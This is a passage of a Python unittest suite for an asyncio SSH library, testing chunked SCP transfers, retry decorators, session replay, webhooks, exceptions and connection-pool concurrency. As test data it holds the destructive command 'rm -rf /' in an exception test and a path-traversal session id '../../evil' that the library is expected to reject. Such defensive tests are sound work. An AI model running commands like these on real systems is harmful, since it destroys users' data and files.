        """Small file (<=chunk_size) should not be chunked."""
        uploaded = []
        class FakeSession:
            async def upload_file(self, local, remote, **kw):
                uploaded.append(remote)
                return {"success": True}
            async def execute(self, cmd, **kw):
                return {"stdout": ""}
        local = Path("/tmp/aiossh_small_upload.bin")
        local.write_bytes(b"small")
        scp = ParallelSCP(FakeSession(), chunk_size=1024)
        result = await scp.upload(str(local), "/remote/out.bin")
        self.assertTrue(result["success"])
        # Should be a single upload, not chunked
        self.assertEqual(len(uploaded), 1)

    async def test_download_small_file_single_chunk(self):
        """Small file should fall back to single download."""
        class FakeSession:
            async def execute(self, cmd, **kw):
                if "getsize" in cmd:
                    return {"stdout": "100\n"}
                return {"stdout": "no-split\n"}
            async def download_file(self, remote, local, **kw):
                Path(local).write_bytes(b"x" * 100)
                return {"success": True, "file_size": 100}
        scp = ParallelSCP(FakeSession(), chunk_size=1024)
        result = await scp.download("/remote/small.bin", "/tmp/aiossh_small_dl.bin")
        self.assertTrue(result["success"])

    async def test_upload_nonexistent_file_raises(self):
        class FakeSession:
            pass
        scp = ParallelSCP(FakeSession(), chunk_size=1024)
        with self.assertRaises(FileNotFoundError):
            await scp.upload("/nonexistent/file.bin", "/remote/out.bin")

    async def test_download_split_failure_fallback(self):
        class FakeSession:
            async def execute(self, cmd, **kw):
                if "getsize" in cmd:
                    return {"stdout": "5000000\n"}
                if "which split" in cmd:
                    return {"stdout": "has-split\n"}
                if "split" in cmd:
                    return {"stdout": "split-failed\n"}
                return {"stdout": ""}
            async def download_file(self, remote, local, **kw):
                Path(local).write_bytes(b"x" * 5000000)
                return {"success": True, "file_size": 5000000}
        scp = ParallelSCP(FakeSession(), chunk_size=1024 * 1024)
        result = await scp.download("/remote/big.bin", "/tmp/aiossh_fallback.bin")
        self.assertTrue(result["success"])

    async def test_progress_callback_called(self):
        class FakeSession:
            async def upload_file(self, local, remote, **kw):
                return {"success": True}
            async def execute(self, cmd, **kw):
                return {"stdout": ""}
        local = Path("/tmp/aiossh_progress.bin")
        local.write_bytes(b"x" * (10 * 1024 * 1024))  # 10 MB, > 8MB chunk
        scp = ParallelSCP(FakeSession(), chunk_size=8 * 1024 * 1024)
        progress_calls = []
        scp.on_progress(lambda p: progress_calls.append(p))
        await scp.upload(str(local), "/remote/out.bin")
        self.assertGreater(len(progress_calls), 0)


# ═══════════════════════════════════════════════════════════════
# 11. Decorators
# ═══════════════════════════════════════════════════════════════

class TestDecorators(unittest.IsolatedAsyncioTestCase):

    async def test_retry_succeeds_first_try(self):
        @retry(max_retries=3)
        async def success():
            return 42
        self.assertEqual(await success(), 42)

    async def test_retry_eventually_succeeds(self):
        call_count = 0
        @retry(max_retries=3)
        async def flaky():
            nonlocal call_count
            call_count += 1
            if call_count < 3:
                raise ValueError("not yet")
            return "done"
        result = await flaky()
        self.assertEqual(result, "done")
        self.assertEqual(call_count, 3)

    async def test_retry_exhausts_retries(self):
        @retry(max_retries=2)
        async def always_fail():
            raise RuntimeError("always")
        with self.assertRaises(RuntimeError):
            await always_fail()

    async def test_retry_zero_retries_raises(self):
        with self.assertRaises(ValueError):
            @retry(max_retries=0)
            async def noop():
                return 1

    async def test_retry_specific_exceptions(self):
        @retry(max_retries=3, exceptions=(ValueError,))
        async def type_error_raiser():
            raise TypeError("wrong type")
        with self.assertRaises(TypeError):
            await type_error_raiser()

    async def test_timing_decorator(self):
        @timing
        async def slow():
            await asyncio.sleep(0.01)
            return "done"
        result = await slow()
        self.assertEqual(result, "done")


# ═══════════════════════════════════════════════════════════════
# 12. SessionReplay
# ═══════════════════════════════════════════════════════════════

class TestSessionReplay(unittest.IsolatedAsyncioTestCase):

    async def test_recorder_roundtrip(self):
        tmpdir = tempfile.mkdtemp(prefix="aiossh_replay_")
        recorder = SessionRecorder("test-session", storage_dir=tmpdir)
        recorder.start()
        recorder.record_command("echo hello")
        recorder.record_result({"exit_code": 0})
        recorder.stop()
        filepath = await recorder.save(compress=False)
        self.assertTrue(Path(filepath).exists())

        replayer = SessionReplayer(filepath)
        await replayer.load()
        summary = replayer.get_summary()
        self.assertEqual(summary["commands_executed"], 1)
        self.assertIn("echo hello", summary["command_list"])

    async def test_recorder_compressed(self):
        tmpdir = tempfile.mkdtemp(prefix="aiossh_replay_")
        recorder = SessionRecorder("test-session", storage_dir=tmpdir)
        recorder.start()
        recorder.record_command("ls")
        recorder.stop()
        filepath = await recorder.save(compress=True)
        self.assertTrue(filepath.endswith(".gz"))
        self.assertTrue(Path(filepath).exists())

    async def test_recorder_not_started(self):
        recorder = SessionRecorder("test-session")
        recorder.record_command("echo hello")  # should be silently ignored
        self.assertEqual(len(recorder._events), 0)

    async def test_replayer_get_summary_before_load(self):
        replayer = SessionReplayer("/nonexistent.iossh")
        self.assertEqual(replayer.get_summary(), {})

    async def test_replayer_speed_1x(self):
        tmpdir = tempfile.mkdtemp(prefix="aiossh_replay_")
        recorder = SessionRecorder("test", storage_dir=tmpdir)
        recorder.start()
        recorder.record_command("cmd1")
        recorder.record_command("cmd2")
        recorder.stop()
        filepath = await recorder.save(compress=False)

        replayer = SessionReplayer(filepath)
        events = []
        await replayer.replay(speed=1.0, callback=lambda t, d: events.append((t, d)))
        self.assertEqual(len(events), 4)  # start + 2 commands + end

    async def test_recorder_session_id_validated(self):
        with self.assertRaises(AIOSSHInvalidParameterError):
            SessionRecorder("../../evil")


# ═══════════════════════════════════════════════════════════════
# 13. WebhookManager
# ═══════════════════════════════════════════════════════════════

class TestWebhookManager(unittest.IsolatedAsyncioTestCase):

    async def test_trigger_sync_callback(self):
        wm = WebhookManager()
        results = []
        wm.on("on_connect", lambda data: results.append(data))
        await wm.trigger("on_connect", {"host": "x"})
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]["host"], "x")

    async def test_trigger_async_callback(self):
        wm = WebhookManager()
        results = []
        async def async_cb(data):
            results.append(data)
        wm.on("on_connect", async_cb)
        await wm.trigger("on_connect", {"host": "x"})
        self.assertEqual(len(results), 1)

    async def test_trigger_callback_exception_silenced(self):
        wm = WebhookManager()
        def bad_cb(data):
            raise RuntimeError("oops")
        wm.on("on_connect", bad_cb)
        # Should not raise
        await wm.trigger("on_connect", {"host": "x"})

    async def test_trigger_unknown_event(self):
        wm = WebhookManager()
        await wm.trigger("unknown_event", {})  # should not raise

    async def test_on_unknown_event_ignored(self):
        wm = WebhookManager()
        wm.on("unknown_event", lambda d: None)  # should not add

    async def test_add_webhook_unknown_event_ignored(self):
        wm = WebhookManager()
        wm.add_webhook("unknown_event", "http://example.com")  # should not add


# ═══════════════════════════════════════════════════════════════
# 14. Exceptions
# ═══════════════════════════════════════════════════════════════

class TestExceptions(unittest.TestCase):

    def test_base_exception_format(self):
        exc = AIOSSHException("msg", code="TEST_CODE")
        self.assertEqual(str(exc), "[TEST_CODE] msg")
        self.assertEqual(exc.code, "TEST_CODE")
        self.assertIn("timestamp", dir(exc))

    def test_exception_with_details(self):
        exc = AIOSSHException("msg", details={"key": "val"})
        self.assertEqual(exc.details["key"], "val")

    def test_exception_with_cause(self):
        original = ValueError("root cause")
        exc = AIOSSHException("msg", cause=original)
        self.assertIs(exc.cause, original)

    def test_command_exception_has_command_field(self):
        exc = AIOSSHCommandError("msg", command="rm -rf /")
        self.assertEqual(exc.command, "rm -rf /")
        self.assertIn("command", exc.details)

    def test_hierarchy_connection(self):
        self.assertTrue(issubclass(AIOSSHConnectionTimeoutError, AIOSSHConnectionError))
        self.assertTrue(issubclass(AIOSSHConnectionRefusedError, AIOSSHConnectionError))
        self.assertTrue(issubclass(AIOSSHHostKeyVerificationError, AIOSSHConnectionError))

    def test_hierarchy_session(self):
        self.assertTrue(issubclass(AIOSSHSessionExpiredError, AIOSSHSessionError))
        self.assertTrue(issubclass(AIOSSHSessionNotFoundError, AIOSSHSessionError))

    def test_hierarchy_command(self):
        self.assertTrue(issubclass(AIOSSHCommandTimeoutError, AIOSSHCommandError))

    def test_hierarchy_file_transfer(self):
        self.assertTrue(issubclass(AIOSSHFileTransferNotFoundError, AIOSSHFileTransferError))
        self.assertTrue(issubclass(AIOSSHFileUploadError, AIOSSHFileTransferError))
        self.assertTrue(issubclass(AIOSSHFileDownloadError, AIOSSHFileTransferError))
        self.assertTrue(issubclass(AIOSSHFileDiskFullError, AIOSSHFileTransferError))

    def test_hierarchy_security(self):
        self.assertTrue(issubclass(AIOSSHIntegrityError, AIOSSHSecurityError))
        self.assertTrue(issubclass(AIOSSHEncryptionError, AIOSSHSecurityError))

    def test_hierarchy_auth(self):
        self.assertTrue(issubclass(AIOSSHInvalidCredentialsError, AIOSSHAuthenticationError))


# ═══════════════════════════════════════════════════════════════
# 15. Concurrency / race-condition tests
# ═══════════════════════════════════════════════════════════════

class TestConcurrency(unittest.IsolatedAsyncioTestCase):

    async def test_concurrent_rate_limiter(self):
        rl = RateLimiter(max_requests=5, window_seconds=60)
        results = await asyncio.gather(*[rl.acquire() for _ in range(10)])
        true_count = sum(1 for r in results if r)
        false_count = sum(1 for r in results if not r)
        self.assertEqual(true_count, 5)
        self.assertEqual(false_count, 5)

    async def test_concurrent_execute_commands(self):
        conn = FakeConnection(command_handler=lambda c: asyncssh.SSHCompletedProcess("ok\n", "", 0))
        session = make_session(conn)
        results = await asyncio.gather(
            session.execute("cmd1"),
            session.execute("cmd2"),
            session.execute("cmd3"),
        )
        self.assertEqual(len(results), 3)
        for r in results:
            self.assertTrue(r["success"])

    async def test_pool_concurrent_get(self):
        pool = ConnectionPool(PoolConfig(max_connections=3, min_connections=0))
        cfg = SSHConfig(host="host.example.com", username="a", password="hunter2pass")
        conns = [FakeConnection() for _ in range(3)]
        with patch("asyncssh.connect", new=AsyncMock(side_effect=conns)):
            sessions = await asyncio.gather(
                pool.get_connection(cfg),
                pool.get_connection(cfg),
                pool.get_connection(cfg),
            )
        self.assertEqual(len(set(id(s) for s in sessions)), 3)
        self.assertEqual(pool.stats["total_connections"], 3)


# ═══════════════════════════════════════════════════════════════
# 16. Upload_file disk space check with Path on Windows
# ═══════════════════════════════════════════════════════════════

class TestUploadDiskSpaceCheck(unittest.IsolatedAsyncioTestCase):

    async def test_disk_space_check_uses_remote_path_not_local_pathlib(self):
        """Regression: upload_file used Path(remote_path).parent which corrupts
        Unix paths on Windows. Verify the SFTP statvfs is called with the
        correct remote directory (not a Windows-corrupted version)."""
        statvfs_calls = []

        class TrackingSFTP(FakeSFTP):
            async def statvfs(self, path):
                statvfs_calls.append(path)
                return super().statvfs(path)

        sftp = TrackingSFTP(free_bytes=10**12)
        conn = FakeConnection(sftp=sftp)
        session = make_session(conn)
        local = Path("/tmp/aiossh_disk_check_test.bin")
        local.write_bytes(os.urandom(100))
        await session.upload_file(str(local), "/home/user/remote/file.bin")

        self.assertEqual(len(statvfs_calls), 1)
        # The directory passed to statvfs should preserve forward slashes
        remote_dir = statvfs_calls[0]
        self.assertIn("/home/user/remote", remote_dir)


if __name__ == "__main__":
    unittest.main(verbosity=2)
